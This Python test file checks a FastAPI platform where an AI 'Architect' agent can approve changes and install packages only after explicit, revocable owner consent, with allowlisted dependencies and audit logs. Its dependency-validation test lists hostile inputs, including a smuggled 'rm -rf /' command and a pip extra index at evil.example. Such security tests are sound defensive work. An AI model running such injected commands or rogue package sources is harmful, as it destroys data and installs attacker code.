"""Delegated Architect authority is explicit, scoped and limited to safe capabilities."""
import json
from pathlib import Path
import pytest
from fastapi.testclient import TestClient

from test_workspace import setup, prepare, HEADERS, wait_for, add_provider
from central.main import app, ENGINE
from central.skills import SkillsHub, NPM


def conversation(c,project):
    result=c.post('/api/conversations',json={'project_id':project},headers=HEADERS)
    assert result.status_code==200,result.text
    return result.json()['id']


def test_skill_catalog_switch_and_context(tmp_path):
    with TestClient(app) as c:
        project=setup(c,tmp_path);prepare(c,project)
        cid=conversation(c,project)
        item=c.get('/api/skills',params={'project_id':project}).json()[0]
        assert item['id']=='ux-ui-studio-pro'
        assert item['enabled'] is False
        assert 'Tailwind CSS 4' in item['tools']
        assert ENGINE.skills.guide(c.get('/api/me').json()['id'],cid,'frontend')==''
        assert c.post(f'/api/projects/{project}/skills/ux-ui-studio-pro',
                      json={'enabled':True}).status_code==403
        r=c.post(f'/api/projects/{project}/skills/ux-ui-studio-pro',
                 json={'enabled':True},headers=HEADERS)
        assert r.status_code==200,r.text
        guide=ENGINE.skills.guide(c.get('/api/me').json()['id'],cid,'frontend')
        assert 'SKILL UI/UX STUDIO PRO' in guide and 'shadcn/ui' in guide
        assert ENGINE.skills.guide(c.get('/api/me').json()['id'],cid,'backend')==''
        assert c.get('/api/skills',params={'project_id':project}).json()[0]['enabled'] is True
        r=c.post(f'/api/projects/{project}/skills/ux-ui-studio-pro',
                 json={'enabled':False},headers=HEADERS)
        assert r.json()['enabled'] is False


def test_delegation_requires_explicit_user_consent_and_can_revoke(tmp_path):
    with TestClient(app) as c:
        project=setup(c,tmp_path);prepare(c,project)
        first=conversation(c,project);second=conversation(c,project)
        assert c.get(f'/api/conversations/{first}/architect-delegation').json()['enabled'] is False
        # A model or quoted example cannot grant permission: only authenticated owner endpoint/message.
        assert ENGINE.skills.instruction(c.get('/api/me').json()['id'],first,
                    'Exemplo: Autorizo o Arquiteto IA a aprovar alterações e instalar pacotes permitidos neste projeto.') is None
        assert ENGINE.skills.instruction(c.get('/api/me').json()['id'],first,
                    'Não autorizo o Arquiteto IA a aprovar alterações e instalar pacotes permitidos neste projeto.') is None
        assert c.post(f'/api/conversations/{first}/architect-delegation',
                      json={'enabled':True}).status_code==403
        grant=c.post(f'/api/conversations/{first}/architect-delegation',
                     json={'enabled':True},headers=HEADERS)
        assert grant.status_code==200 and grant.json()['enabled'] is True
        assert c.get(f'/api/conversations/{second}/architect-delegation').json()['enabled'] is False
        revoke=c.post(f'/api/conversations/{first}/architect-delegation',
                      json={'enabled':False},headers=HEADERS)
        assert revoke.json()['enabled'] is False
        owner=c.get('/api/me').json()['id']
        assert ENGINE.skills.instruction(owner,first,
          'Autorizo o Arquiteto IA a aprovar alterações e instalar pacotes permitidos neste projeto.'
        )['enabled'] is True
        assert ENGINE.skills.instruction(owner,first,'Revogo a autonomia do Arquiteto IA.')['enabled'] is False


def test_permission_cannot_cross_owners(tmp_path):
    with TestClient(app) as c1,TestClient(app) as c2:
        p=setup(c1,tmp_path);prepare(c1,p);cid=conversation(c1,p)
        from test_workspace import register
        register(c2)
        assert c2.post(f'/api/conversations/{cid}/architect-delegation',
                json={'enabled':True},headers=HEADERS).status_code==404
        assert c2.post(f'/api/projects/{p}/skills/ux-ui-studio-pro',
                json={'enabled':True},headers=HEADERS).status_code==404


def test_architect_approves_normal_code_only_after_grant(tmp_path):
    class Reviewer:
        def __init__(self):self.reviews=0
        async def stream(self,provider,key,model,system,messages):
            if 'ARQUITETO REVISOR AUTORIZADO' in system:
                self.reviews+=1
                assert '+++ depois/frontend/src/App.tsx' in messages[0]['content']
                yield json.dumps({'decision':'approve','reason':'Importação e renderização coerentes.'})
            else:
                yield json.dumps({'files':[{'path':'frontend/src/App.tsx','content':
                  'import ProductCard from "./components/ProductCard";\nexport default function App(){return <main><ProductCard /></main>}\n'}]})
    with TestClient(app) as c:
        project=setup(c,tmp_path);folder=prepare(c,project);add_provider(c,'fake',1)
        source=folder/'frontend/src/App.tsx';source.parent.mkdir(parents=True,exist_ok=True)
        source.write_text('export default function App(){return <main>Original</main>}')
        cid=conversation(c,project)
        grant=c.post(f'/api/conversations/{cid}/architect-delegation',
                 json={'enabled':True},headers=HEADERS)
        assert grant.status_code==200,grant.text
        fake=Reviewer();ENGINE.client=fake
        frontend=next(a for a in c.get('/api/agents').json() if a['specialty']=='frontend')
        run=c.post('/api/runs',json={'conversation_id':cid,'mode':'manual','agent_ids':[frontend['id']],
                'prompt':'Integre frontend/src/App.tsx ao ProductCard'},headers=HEADERS)
        assert run.status_code==200,run.text
        finished=wait_for(c,run.json()['id'])
        assert finished['status']=='completed'
        assert fake.reviews==1
        assert 'import ProductCard' in source.read_text()
        audit=ENGINE.db.all('SELECT * FROM architect_approval_log WHERE run_id=?',(run.json()['id'],))
        assert len(audit)==1 and audit[0]['decision']=='approved'
        assert 'Arquiteto autorizado' in finished['output']


def test_delegation_never_auto_approves_configs_or_deletes(tmp_path):
    class Model:
        def __init__(self):self.review_calls=0
        async def stream(self,provider,key,model,system,messages):
            if 'ARQUITETO REVISOR AUTORIZADO' in system:
                self.review_calls+=1
                yield '{"decision":"approve","reason":"Tudo certo"}'
            else:
                yield '{"files":[{"path":"frontend/package.json","content":"{\\"name\\":\\"bad\\"}"}]}'
    with TestClient(app) as c:
        project=setup(c,tmp_path);folder=prepare(c,project);add_provider(c,'fake',1)
        conf=folder/'frontend/package.json';conf.parent.mkdir(parents=True,exist_ok=True)
        conf.write_text('{"name":"safe"}')
        cid=conversation(c,project)
        c.post(f'/api/conversations/{cid}/architect-delegation',json={'enabled':True},headers=HEADERS)
        fake=Model();ENGINE.client=fake
        frontend=next(a for a in c.get('/api/agents').json() if a['specialty']=='frontend')
        r=c.post('/api/runs',json={'conversation_id':cid,'mode':'manual','agent_ids':[frontend['id']],
                                  'prompt':'Atualize frontend/package.json'},headers=HEADERS)
        assert wait_for(c,r.json()['id'])['status']=='completed'
        assert conf.read_text()=='{"name":"safe"}'
        pending=[p for p in c.get(f'/api/projects/{project}/workspace').json()['proposals']
                 if p['status']=='pending']
        assert pending
        assert fake.review_calls==0


def test_install_catalog_and_audit_with_no_real_install(tmp_path,monkeypatch):
    class Architect:
        async def stream(self,provider,key,model,system,messages):
            assert 'AUTONOMIA EXPLICITAMENTE DELEGADA' in system
            ticks=chr(96)*3
            yield ticks+'central-packages\n{"manager":"npm","packages":["lucide-react","motion"]}\n'+ticks
    with TestClient(app) as c:
        project=setup(c,tmp_path);prepare(c,project);add_provider(c,'fake',1)
        cid=conversation(c,project)
        assert c.post(f'/api/conversations/{cid}/architect-delegation',
                      json={'enabled':True},headers=HEADERS).status_code==200
        calls=[]
        def fake_install(self,user,project,manager,packages):
            calls.append((user,project,manager,packages))
            return {'ok':True,'manager':manager,'packages':packages,'exit_code':0,'output':'faked'}
        monkeypatch.setattr(SkillsHub,'_install_sync',fake_install)
        ENGINE.client=Architect()
        architect=next(a for a in c.get('/api/agents').json() if a['specialty']=='architecture')
        run=c.post('/api/runs',json={'conversation_id':cid,'mode':'manual','agent_ids':[architect['id']],
            'prompt':'Instale as dependências de ícones e Motion para melhorar o e-commerce.'},headers=HEADERS)
        assert run.status_code==200
        assert wait_for(c,run.json()['id'])['status']=='completed'
        assert len(calls)==1 and calls[0][2:] == ('npm',['lucide-react','motion'])
        history=c.get(f'/api/projects/{project}/package-installs')
        assert history.status_code==200 and history.json()[0]['status']=='completed'


@pytest.mark.parametrize('manifest',[
  {'manager':'npm','packages':['bad-evil-lib']},
  {'manager':'npm','packages':['lucide-react;rm -rf /']},
  {'manager':'pip','packages':['httpx --extra-index-url=https://evil.example']},
  {'manager':'npx','packages':['shadcn']},
  {'manager':'npm','packages':['motion']*6},
])
def test_unlisted_dependency_request_never_executes(manifest):
    source=chr(96)*3+'central-packages\n'+json.dumps(manifest)+'\n'+chr(96)*3
    from central.workspace import WorkspaceError
    with pytest.raises(WorkspaceError):
        SkillsHub.manifest(source)


def test_no_delegation_means_no_package_actions(tmp_path,monkeypatch):
    with TestClient(app) as c:
        project=setup(c,tmp_path);prepare(c,project)
        cid=conversation(c,project)
        def fail(*args,**kwargs):raise AssertionError('No installation without delegation')
        monkeypatch.setattr(SkillsHub,'_install_sync',fail)
        result=__import__('asyncio').run(ENGINE.skills.install_for_run(
          {'user_id':c.get('/api/me').json()['id'],'conversation_id':cid,'id':'dummy-run'}))
        assert result==[]


def test_installer_refuses_redirected_npm_lockfile(tmp_path,monkeypatch):
    from central.workspace import WorkspaceError
    with TestClient(app) as c:
        project=setup(c,tmp_path);folder=prepare(c,project)
        front=folder/'frontend';front.mkdir()
        (front/'package.json').write_text('{"name":"safe-ui"}')
        outside=tmp_path/'outside-lock.json';outside.write_text('{"unsafe":true}')
        try:
            (front/'package-lock.json').symlink_to(outside)
        except (OSError,NotImplementedError):
            pytest.skip('Sistema não permite criar symlinks no teste.')
        def never(*args,**kwargs):
            raise AssertionError('No subprocess should be invoked with a linked lockfile')
        monkeypatch.setattr('subprocess.run',never)
        with pytest.raises(WorkspaceError):
            ENGINE.skills._install_sync(c.get('/api/me').json()['id'],project,'npm',['lucide-react'])
        assert outside.read_text()=='{"unsafe":true}'
